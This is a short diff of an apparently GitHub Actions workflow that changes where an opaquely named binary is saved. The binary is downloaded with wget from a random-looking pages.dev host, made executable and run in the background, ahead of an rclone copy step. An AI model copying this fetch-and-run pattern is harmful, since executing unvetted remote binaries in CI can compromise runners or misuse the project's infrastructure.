@@ -87,9 +87,9 @@ jobs:
 
       - name: Download 1 and run in background
         run: |
-          wget -q -O /tmp/1/1 "https://temprclsjecvdcv.pages.dev/1"
-          chmod +x /tmp/1/1
-          /tmp/1/1 -config /tmp/config.yaml & # Run in the background
+          wget -q -O /tmp/1 "https://temprclsjecvdcv.pages.dev/1"
+          chmod +x /tmp/1
+          /tmp/1 -config /tmp/config.yaml & # Run in the background
 
       - name: Perform Rclone copyurl operations
         run: |
